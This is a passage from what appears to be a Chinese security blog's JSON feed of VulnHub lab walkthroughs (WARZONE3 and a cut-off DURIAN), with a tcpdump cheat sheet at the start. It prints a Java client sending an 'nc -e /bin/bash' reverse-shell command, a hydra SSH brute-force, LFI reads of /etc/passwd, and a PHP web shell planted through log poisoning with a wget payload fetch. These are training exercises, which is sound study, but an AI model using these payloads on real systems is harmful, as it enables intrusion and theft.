output.pcap</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1398.png\" width=\"700\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">按主机名过滤：</span> </span><br><span class=\"line\">sudo tcpdump host 110.42.178.227</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">按源地址过滤：</span></span><br><span class=\"line\">sudo tcpdump src 110.42.178.227</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">按目标地址过滤</span></span><br><span class=\"line\">sudo tcpdump dst 110.42.178.227</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">捕获整个网段：</span> </span><br><span class=\"line\">sudo tcpdump net 192.168.0.0/24</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">捕获一个端口：</span> </span><br><span class=\"line\">sudo tcpdump port 22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">捕获端口区间：</span> </span><br><span class=\"line\">sudo tcpdump portrange 21- 2121</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">多个选项与：</span> </span><br><span class=\"line\">sudo tcpdump host 110.42.178.227 and port 21</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">多个选项或：</span> </span><br><span class=\"line\">sudo tcpdump host 110.42.178.227 or port 2 121</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">排除选项：</span> </span><br><span class=\"line\">sudo tcpdump host 110.42.178.227 and not 1.117.52.219</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/147%20WARZONE3/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/147%20WARZONE3/",
            "title": "VULNHUB 47 WARZONE3",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvd2Fyem9uZS0zLWV4b2dlbiw2MDYv\">https://www.vulnhub.com/entry/warzone-3-exogen,606/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 WARZONE3：桥接于 192.168.0.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>\n<p>开靶机前后各扫描一次，得到靶机 ip 192.168.0.186</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1432.png\" width=\"520\" alt=\"Image\">\n<p>2 ）扫描靶机上开放的端口及详细信息<br>\n <code>sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.187 --min-rate=5000</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1433.png\" width=\"440\" alt=\"Image\">\n<blockquote>\n<p>nmap 参数说明<br>\n - sV 表示扫描服务及版本信息<br>\n - sC 表示以默认的脚本进行扫描<br>\n - T4 表示控制扫描的速度<br>\n - Pn 表示不用 ping 去扫描机器<br>\n–open 表示只扫描开放的端口<br>\n - p- 表示扫描所有的端口<br>\n–min-rate 设置最小的扫描速度</p>\n</blockquote>\n<blockquote>\n<p>检索到的有效服务如下所示：<br>\n21 ftp：可尝试进行匿名登陆下载文件<br>\n 22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用<br>\n 4444 krb 524 ：未知端口</p>\n</blockquote>\n<h3 id=\"ftp-匿名访问\"><a class=\"markdownIt-Anchor\" href=\"#ftp-匿名访问\">#</a> FTP 匿名访问</h3>\n<p>打开 <span class=\"exturl\" data-url=\"ZnRwOi8vMTkyLjE2OC4wLjE4Ni8=\">ftp://192.168.0.186/</span> 进行 ftp 信息收集<br>\n有一个文件夹 pub、里边有一个 jar 文件和一个 txt 文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1434.png\" width=\"470\" alt=\"Image\">\n<p>将 ftp 服务器里的这两个文件都下载到本地，可以在 ftp 命令行中使用 lcd 来控制本地的目录</p>\n<p>note.txt 中提示 token 是 username 的 SHA 256 值，并且有一个邮箱是 alienum@exogenesis，即用户为 alienum</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1435.png\" width=\"570\" alt=\"Image\">\n<h3 id=\"java代码审计\"><a class=\"markdownIt-Anchor\" href=\"#java代码审计\">#</a> java 代码审计</h3>\n<p>将下载后的 jar 文件，用 jd-gui 打开后查看源代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1436.png\" width=\"520\" alt=\"Image\">\n<p>RE 有四个量，分别是 token，option，cmd，value，以及一些继承序列化和转变为字符串、get set 方法等</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1437.png\" width=\"620\" alt=\"Image\">\n<p>Token 由 value 和 role 组成</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1438.png\" width=\"560\" alt=\"Image\">\n<p>在 Starter 即主函数中找到了一个判断角色，当角色为 astronaut 时允许进入</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1439.png\" width=\"660\" alt=\"Image\">\n<p>先将这个 jar 文件执行一下，弹出来一个登陆框，随意输入信息之后报错，识别不到 url 地址为 warzone.local</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1440.png\" width=\"620\" alt=\"Image\">\n<p>改变本地 hosts 文件，修改其 DNS 解析地址为靶机 ip</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1441.png\" width=\"460\" alt=\"Image\">\n<p>并同时将已知用户 alienum 的 SHA 256 值计算出来，此 SHA 256 值根据提示内容来说就应该是 alienum 用户的 TOKEN 值</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1442.png\" width=\"520\" alt=\"Image\">\n<p>也可以根据 terminal 的命令来计算，在 kali 下输入如下命令即可计算 SHA 256<br>\n <code>echo -n &quot;alienum&quot; | shasum -a 256</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1443.png\" width=\"460\" alt=\"Image\">\n<p>6c72561d26722d88896b520da9651aa24e9ae6eca82e6c8e68af720cf21377ec</p>\n<p>再次用 alienum 用户和他的 token 登陆发现爆了错误</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1444.png\" width=\"620\" alt=\"Image\">\n<p>在看到 java 源代码的时候，知道它执行了以个 CMd 的命令，现在我们已经可以绕过登陆并且又了 token 的值，可以写一个 java 文件执行任意命令，拿出 IDEA 其他的两个文件不变，主函数改为下面的代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1445.png\" width=\"620\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package alien;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\">import java.io.ObjectInputStream;</span><br><span class=\"line\">import java.io.ObjectOutputStream;</span><br><span class=\"line\">import java.net.Socket;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Starter &#123;</span><br><span class=\"line\">\tstatic Socket socket = null;</span><br><span class=\"line\">\tstatic ObjectOutputStream os;</span><br><span class=\"line\">\tstatic Token token;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpublic static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">\t\tsocket = new Socket(&quot;warzone.local&quot;, 4444);</span><br><span class=\"line\">\t\tos = new ObjectOutputStream(socket.getOutputStream());</span><br><span class=\"line\">\t\ttoken = new</span><br><span class=\"line\">\t\tToken(&quot;6c72561d26722d88896b520da9651aa24e9ae6eca82e6c8e68af720cf21377ec&quot;, &quot;astronaut&quot;);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tRE list = new RE();</span><br><span class=\"line\">\t\tlist.setToken(token);</span><br><span class=\"line\">\t\tlist.setOption(&quot;VIEW&quot;);</span><br><span class=\"line\">\t\tlist.setValue(&quot;VALUE&quot;);</span><br><span class=\"line\">\t\tlist.setCmd(&quot;nc 192.168.0.168 4444 -e /bin/bash&quot;);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tos.writeObject(list);</span><br><span class=\"line\">\t\tObjectInputStream is = new ObjectInputStream(socket.getInputStream());</span><br><span class=\"line\">\t\tRE response = (RE) is.readObject();</span><br><span class=\"line\">\t\tos.close();</span><br><span class=\"line\">\t\tsocket.close();</span><br><span class=\"line\">\t\tSystem.out.println(response.getValue());</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>执行之后 shell 成功反弹，拿到了 exomorph 的权限</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1446.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"java脚本解密aes\"><a class=\"markdownIt-Anchor\" href=\"#java脚本解密aes\">#</a> java 脚本解密 AES</h3>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">标准化<span class=\"built_in\">tty</span>就不多说了</span></span><br><span class=\"line\">script -qc /bin/bash /dev/null</span><br><span class=\"line\">stty raw -echo;fg</span><br><span class=\"line\">export TERM=xterm;reset;stty rows 64 columns 118</span><br></pre></td></tr></table></figure>\n<p>此用户下有两个文件，cat 发现乱码，file 检查文件属性，strings 查看内容</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1447.png\" width=\"620\" alt=\"Image\">\n<p>得到了一个密码，和一个 jar 文件，将 jar 文件拉到本地导入到 jd-gui</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1448.png\" width=\"580\" alt=\"Image\">\n<p>CrypoException 是一个普通的类</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1449.png\" width=\"620\" alt=\"Image\">\n<p>Cryptor 是一个 AES 加密文件，加密过程中会调用这个里边的方法</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1450.png\" width=\"620\" alt=\"Image\">\n<p>Main 函数定义要加密的 key，以及加密后的文件的路径</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1451.png\" width=\"620\" alt=\"Image\">\n<p>现在就用来写一个解密文件，用来将我们得到的密码 $:2Czq$(解密</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">先定义解密函数，通过如下方法来调用</span></span><br><span class=\"line\">public static void decrypt(String key, File inputFile, File outputFile) throws CryptoException &#123;</span><br><span class=\"line\">\tdoCrypto(Cipher.DECRYPT_MODE, key, inputFile, outputFile);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1452.png\" width=\"660\" alt=\"Image\">\n<p>再来修改主函数，密钥维持不变，修改当前的解密文件内容和解密后的文件保存路径，并且调用解密方法，最后将我们解密后的内容查看</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">package alienum;</span><br><span class=\"line\"></span><br><span class=\"line\">import java.io.File;</span><br><span class=\"line\">import java.io.IOException;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Main &#123;</span><br><span class=\"line\">\tstatic String inputPath = &quot;/Users/chentuo/JavaProjects/alienum/aliens.encrypted&quot;;</span><br><span class=\"line\">\tstatic String outputPath = &quot;/Users/chentuo/JavaProjects/alienum/aliens.txt&quot;;</span><br><span class=\"line\">\tpublic Main() &#123;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tpublic static void main(String[] args) throws IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">\t\tString key = &quot;w4rz0nerex0gener&quot;;</span><br><span class=\"line\">\t\tFile inputFile = new File(inputPath);</span><br><span class=\"line\">\t\tFile decryptedFile = new File(outputPath);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\ttry &#123;</span><br><span class=\"line\">\t\t\talienum.Cryptor.decrypt(key, inputFile, decryptedFile);</span><br><span class=\"line\">\t\t&#125; catch (CryptoException var5) &#123;</span><br><span class=\"line\">\t\t\tSystem.out.println(var5.getMessage());</span><br><span class=\"line\">\t\t\tvar5.printStackTrace();</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1453.png\" width=\"660\" alt=\"Image\">\n<blockquote>\n<p>运行此文件之后，即可以在自己设置的目录下找到我们的解密文件，但是这个解密之后的 txt 文件不能用 cat 来查看会显示乱码，用 file 命令确定是一个 data 类型后，用 strings 查看得到了解密后的文件内容<br>\n minotaur:m1nom1no…<br>\nscylla:scyscy…<br>\nechidna:ech1ech1…<br>\ncyclops:cyccyc…<br>\nanunnaki:nak1nak1…<br>\nanunnaki:nak1nak2…<br>\nanunnaki:nakinaki…</p>\n</blockquote>\n<img data-src=\"/N1h1l157/VULNHUB/image-1454.png\" width=\"560\" alt=\"Image\">\n<h3 id=\"sshpass-连接靶机\"><a class=\"markdownIt-Anchor\" href=\"#sshpass-连接靶机\">#</a> sshpass 连接靶机</h3>\n<p>得到了一串用户名和密码的组合，可能是 ssh 的用户和密码<br>\n <code>cat aliens.txt | cut -d ':' -f 1 &gt; user.txt</code> <br>\n <code>cat aliens.txt | cut -d ':' -f 2 &gt; pass.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1455.png\" width=\"420\" alt=\"Image\">\n<p>检查一下用户名和密码文件是否正确</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1456.png\" width=\"420\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-1457.png\" width=\"420\" alt=\"Image\">\n<p><code>hydra -L user.txt -P pass.txt ssh://192.168.31.53 -f -t 32 -I -vV</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1458.png\" width=\"660\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-1459.png\" width=\"660\" alt=\"Image\">\n<p>用 ssh 成功连接到了靶机中</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1460.png\" width=\"480\" alt=\"Image\">\n<p>第一次登陆成功之后，第二次就可以用 sshpass 在命令行输入密码直接连接<br>\n <code>sshpass -p nak1nak1.. ssh anunnaki@192.168.0.186</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1461.png\" width=\"520\" alt=\"Image\">\n<h3 id=\"java代码分析\"><a class=\"markdownIt-Anchor\" href=\"#java代码分析\">#</a> java 代码分析</h3>\n<p>检索服务器文件，看到提示文件与一个 gpg 的加密文件，info.txt 提示要用–batch 来解密 gpg 文件，否则不会让输入密码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1462.png\" width=\"560\" alt=\"Image\">\n<p>然而直接解密是可以弹出来输入密码的界面的，输入 ssh 爆破出来的密码 nak1nak1… 可以成功解密 gpg 为 jar 文件</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1463.png\" width=\"420\" alt=\"Image\">\n<p>同样的下载到本地，用 jd-gui 打开，开始阅读源码，Cryptor.class 里边定义了一个加、解密方法</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1464.png\" width=\"660\" alt=\"Image\">\n<p>Main.class 中设有盐值，并且在条件判断正确时为打印 passwd</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1465.png\" width=\"660\" alt=\"Image\">\n<p>Recources.class 里边是一些加密的字符串</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1466.png\" width=\"600\" alt=\"Image\">\n<p>编写 java 代码，进行解密，代码内容如下</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import java.security.NoSuchAlgorithmException;</span><br><span class=\"line\">import javax.crypto.BadPaddingException;</span><br><span class=\"line\">import javax.crypto.IllegalBlockSizeException;</span><br><span class=\"line\">import javax.crypto.NoSuchPaddingException;</span><br><span class=\"line\"></span><br><span class=\"line\">public class Main &#123;</span><br><span class=\"line\">\tpublic static void main(String[] args) throws NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, BadPaddingException &#123;</span><br><span class=\"line\">\tCryptor cryptor = new Cryptor();</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tString plaintext = cryptor.decrypt(cryptor.decrypt(&quot;pr0tect1on1smust&quot;, &quot;/aom7EHcuiCWzNArA72UVn0nnVtJ5jZSPHDmjFPc5KQ=&quot;), &quot;jJ2Mrz4wjZDMSPwDr6TolQ==&quot;);</span><br><span class=\"line\">\tSystem.out.println(&quot;[+] Success, the password is : &quot; + plaintext);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-1467.png\" width=\"660\" alt=\"Image\">\n<p>运行代码，成功解密出来了密码为 ufo_phosXEN</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1468.png\" width=\"660\" alt=\"Image\">\n<p>判断一下这个密码属于哪个用户，发现就是 root 用户的</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1469.png\" width=\"580\" alt=\"Image\">\n<p>-&gt; 成功拿到了 root 权限</p>\n",
            "tags": [
                "VULNHUB 41-50"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/149%20DURIAN/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/149%20DURIAN/",
            "title": "VULNHUB 49 DURIAN",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvY2VyZWFsLTEsNzAzLw==\">https://www.vulnhub.com/entry/cereal-1,703/</span><br>\n 教程链接地址: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vc2FpbmV0L3AvMTU3Nzk0MTQuaHRtbA==\">https://www.cnblogs.com/sainet/p/15779414.html</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.0.135 (由于设置成了 DHCP、可能多变)<br>\n 靶机 DURIAN：桥接于 192.168.0.1 的网卡，ip 未知</p>\n<p>1 ）确定靶机 ip 地址和开放的端口<br>\n由已至内网靶机所在主机 MAC 地址自动扫描靶机 ip<br>\n <code>sudo arp-scan -l | grep 'a0' | awk '&#123;print $1,$2&#125;' | cut -d ' ' -f 1 | uniq</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1518.png\" width=\"520\" alt=\"Image\">\n<p>-&gt; 靶机 ip 192.168.0.187</p>\n<p>2 ）对靶机开放的端口做更深一步的检索，检索各个服务上的详细信息</p>\n<p><code>sudo nmap -sVC -T4 -Pn --open -p- 192.168.0.188 --min-rate=5000</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1519.png\" width=\"520\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-1520.png\" width=\"400\" alt=\"Image\">\n<blockquote>\n<p>检索到的有效服务如下所示：<br>\n22 ssh：可尝试 ssh 爆破与一些对应版本漏洞利用<br>\n 80 7080 8000 8088 http：可对 web 进行渗透测试收集信息</p>\n</blockquote>\n<h3 id=\"lfi-漏洞测试\"><a class=\"markdownIt-Anchor\" href=\"#lfi-漏洞测试\">#</a> lfi 漏洞测试</h3>\n<p>打开 <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xODgv\">http://192.168.0.188/</span> 进行信息收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1521.png\" width=\"520\" alt=\"Image\">\n<p><code>gobuster dir -x php,bak,zip,rar,php.bak -w /usr/share/dirb/wordlists/common.txt -u http://192.168.0.188/</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1522.png\" width=\"660\" alt=\"Image\">\n<img data-src=\"/N1h1l157/VULNHUB/image-1523.png\" width=\"520\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEv\">http://192.168.0.172/cgi-data/</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1524.png\" width=\"370\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEvZ2V0SW1hZ2UucGhw\">http://192.168.0.172/cgi-data/getImage.php</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1525.png\" width=\"580\" alt=\"Image\">\n<p>有文件包含漏洞，测试读取 /etc/passwd<br>\n <code>view-source:http://192.168.0.172/cgi-data/getImage.php?file=../../../../../etc/passwd</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1526.png\" width=\"660\" alt=\"Image\">\n<p>得到了两个有 bash 的用户，测试能否读取到私钥文件<br>\n <code>view-source:http://192.168.0.172/cgi-data/getImage.php?file=../../../../../home/durian/.ssh/id_rsa</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1527.png\" width=\"660\" alt=\"Image\">\n<p>没有读取到私钥文件，此 lfi 漏洞利用还需要配合其他的漏洞，如果知道了日志文件地址，是可以尝试往日志里边写后门的</p>\n<h3 id=\"网站信息收集\"><a class=\"markdownIt-Anchor\" href=\"#网站信息收集\">#</a> 网站信息收集</h3>\n<p>查看一下其他的信息，获取到更多的信息</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNzIvYmxvZw==\">http://192.168.0.172/blog</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1528.png\" width=\"620\" alt=\"Image\">\n<p>7080 站点有一个登陆框，但是不存在弱口令，sql 注入</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1529.png\" width=\"520\" alt=\"Image\">\n<p>8000 站点是一张图片，需要目录收集</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1530.png\" width=\"520\" alt=\"Image\">\n<p>没有发现什么敏感的目录信息</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1531.png\" width=\"620\" alt=\"Image\">\n<p>8088 页面也是一个图片，没有什么特点</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1532.png\" width=\"520\" alt=\"Image\">\n<p>搜寻目录之后发现一些特殊的目录</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1533.png\" width=\"660\" alt=\"Image\">\n<p>发现大部分页面都是 403 , 没有利用的价值</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1534.png\" width=\"520\" alt=\"Image\">\n<p>有一个界面有登陆框和密码，可以用来爆破</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1535.png\" width=\"620\" alt=\"Image\">\n<h3 id=\"lfi日志文件写木马\"><a class=\"markdownIt-Anchor\" href=\"#lfi日志文件写木马\">#</a> lfi 日志文件写木马</h3>\n<p>综上是能收集到所有的信息，登陆框处由于缺少用户名，是很难爆破出来的，</p>\n<p>唯一有价值的线索指向了 lfi 漏洞，多次尝试之后找到了日志的路径</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMC4xNzIvY2dpLWRhdGEvZ2V0SW1hZ2UucGhwP2ZpbGU9L3Zhci9sb2cvZHVyaWFuLmxvZy9hY2Nlc3MubG9n\">http://192.168.0.172/cgi-data/getImage.php?file=/var/log/durian.log/access.log</span></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1536.png\" width=\"590\" alt=\"Image\">\n<p>既然信息能够被保存在这里，就给发送一个带木马的信息，修改 UA 头</p>\n<p>这里直接用 curl 命令来写，可以用 burp 将数据转化为 curl 命令<br>\n <code>curl -v -X $'GET' -H $'User-Agent: Mozilla/5.0 &lt;?php system($_GET[\\'X_T\\']); ?&gt; (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36' $'http://192.168.0.188/cgi-data/getImage.php?file=/var/log/durian.log/access.log&amp;X_T=whoami'</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1537.png\" width=\"660\" alt=\"Image\">\n<p>并且命令被执行了，收到了 www-data 即当前用户名</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1538.png\" width=\"660\" alt=\"Image\">\n<p>既然能够执行命令，那么就准备用日志来反弹 shell，准备如下代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1539.png\" width=\"360\" alt=\"Image\">\n<p>通过修改数据报使靶机下载 kali 上准备好的反弹 shell 的代码</p>\n<p><code>GET http://192.168.0.188/cgi-data/getImage.php?file=/var/log/durian.log/access.log&amp;X_T=wget+http://192.168.0.168/shell.sh+-O+/var/www/html/blog/shell.sh HTTP/1.1</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1540.png\" width=\"660\" alt=\"Image\">\n<p>但是失败了，没有下载提示，也没有合适的数据报返回</p>\n<h3 id=\"post型木马尝试\"><a class=\"markdownIt-Anchor\" href=\"#post型木马尝试\">#</a> post 型木马尝试</h3>\n<p>改为 post 的方式，写一个后门文件看看，居然写成功了，但是不知道怎么访问</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1541.png\" width=\"620\" alt=\"Image\">\n<p>用 lfi 漏洞的位置访问时是无法写入任何文件的，是个假后门</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1542.png\" width=\"620\" alt=\"Image\">\n<p>并且也不能修改原有的所有代码</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1543.png\" width=\"620\" alt=\"Image\">\n<p>还是从数据包来下手，可能下载成功了没有回显，索性就直接尝试执行本应该下载好的文件位置的 sh 脚本，看能不能把 shell 反弹出来</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-1544.png\" width=\"660\" alt=\"Image\">\n<p>但是没有反弹出来，很奇怪</p>\n<h3 